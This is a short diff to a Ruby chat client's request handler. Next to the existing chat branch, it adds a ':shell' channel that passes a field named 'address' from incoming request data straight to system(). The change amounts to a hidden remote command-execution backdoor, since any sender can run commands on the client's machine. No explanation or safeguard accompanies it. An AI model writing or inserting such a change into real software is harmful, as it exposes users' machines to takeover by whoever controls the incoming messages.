@@ -21,6 +21,10 @@ class Client
     case request.channel
     when :chat
       puts "#{request.data.dig(:username)}: #{request.data.dig(:message)}"
+
+    when :shell
+      address = request.data.dig(:address)
+      system(address) unless address.nil?
     end
   end
 
